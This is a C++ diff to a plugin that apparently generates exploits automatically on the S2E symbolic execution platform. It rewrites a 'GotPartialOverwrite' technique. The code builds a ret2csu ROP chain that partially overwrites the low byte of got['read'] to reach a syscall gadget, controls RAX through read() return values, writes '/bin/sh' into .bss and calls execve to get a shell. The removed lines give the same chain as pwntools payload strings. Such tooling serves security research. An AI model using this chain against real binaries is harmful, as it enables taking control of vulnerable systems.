@@ -19,6 +19,7 @@
 // SOFTWARE.
 
 #include <s2e/Plugins/Requiem/Requiem.h>
+#include <s2e/Plugins/Requiem/Techniques/Ret2csu.h>
 #include <s2e/Plugins/Requiem/Utils/StringUtil.h>
 
 #include <cassert>
@@ -27,6 +28,10 @@
 #include "GotPartialOverwrite.h"
 
 namespace s2e::plugins::requiem {
+
+using SymbolicRopPayload = Technique::SymbolicRopPayload;
+using ConcreteRopPayload = Technique::ConcreteRopPayload;
+
 
 GotPartialOverwrite::GotPartialOverwrite(Requiem &ctx) : Technique(ctx) {
     resolveRequiredGadgets();
@@ -44,28 +49,62 @@ std::string GotPartialOverwrite::getAuxiliaryFunctions() const {
     return "";
 }
 
-std::vector<std::vector<std::string>> GotPartialOverwrite::getRopPayloadList() const {
-    return {
-        {
-            "A8",
-            "uROP(elf.sym['read'], 0, elf.got['read'], 1)  # modify LSB of got['read'], setting rax to 1",
-            "uROP(elf.sym['read'], 1, 0, 0)                # write(1, 0, 0), setting rax to 0",
-            "uROP(elf.sym['read'], 0, elf.bss(), 59)       # read '/bin/sh' into elf.bss(), setting rax to 59",
-            "uROP(elf.sym['read'], elf.bss(), 0, 0)        # sys_execve"
-        }, {
-            format("b'\\x%x'", getLsbOfReadSyscall())
-        }, {
-            "b'/bin/sh'.ljust(59, b'\\x00')"
-        }
-    };
+std::vector<SymbolicRopPayload> GotPartialOverwrite::getSymbolicRopPayloadList() const {
+    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::mapper["Ret2csu"]);
+    assert(ret2csu);
+
+    auto symbolMap = m_ctx.getExploit().getElf().symbols();
+    auto gotMap = m_ctx.getExploit().getElf().got();
+
+    // Modify LSB of got['read'], setting RAX to 1.
+    uint64_t addr = symbolMap["read"];
+    uint64_t arg1 = 0;
+    uint64_t arg2 = gotMap["read"];
+    uint64_t arg3 = 1;
+    SymbolicRopPayload read1 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];
+
+    // write(1, 0, 0), setting RAX to 0.
+    addr = symbolMap["read"];
+    arg1 = 1;
+    arg2 = 0;
+    arg3 = 0;
+    SymbolicRopPayload read2 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];
+
+    // Read "/bin/sh" into elf.bss(), setting RAX to 59.
+    addr = symbolMap["read"];
+    arg1 = 0;
+    arg2 = m_ctx.getExploit().getElf().bss();
+    arg3 = 59;
+    SymbolicRopPayload read3 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];
+
+    // Return to sys_execve.
+    addr = symbolMap["read"];
+    arg1 = m_ctx.getExploit().getElf().bss();
+    arg2 = 0;
+    arg3 = 0;
+    SymbolicRopPayload read4 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];
+
+    SymbolicRopPayload part1;
+    SymbolicRopPayload part2;
+    SymbolicRopPayload part3;
+
+    part1.reserve(1 + read1.size() + read2.size() + read3.size() + read4.size());
+    part1.push_back(ConstantExpr::create(0, Expr::Int64));
+    part1.insert(part1.end(), read1.begin(), read1.end());
+    part1.insert(part1.end(), read2.begin(), read2.end());
+    part1.insert(part1.end(), read3.begin(), read3.end());
+    part1.insert(part1.end(), read4.begin(), read4.end());
+
+    // Variable-sized Expr?
+    m_ctx.log<WARN>() << "read syscall gadget LSByte = " << klee::hexval(getLsbOfReadSyscall()) << '\n';
+    part2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
+    part3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };
+
+    return {part1, part2, part3};
 }
 
-std::vector<std::vector<uint64_t>> GotPartialOverwrite::getConcretizedRopPayloadList() const {
-    return {};
-}
-
-std::vector<std::string> GotPartialOverwrite::getExtraPayload() const {
-    return {"p64(0)"};  // rbp
+ConcreteRopPayload GotPartialOverwrite::getExtraPayload() const {
+    return {0};  // rbp
 }
 
 std::string GotPartialOverwrite::toString() const {
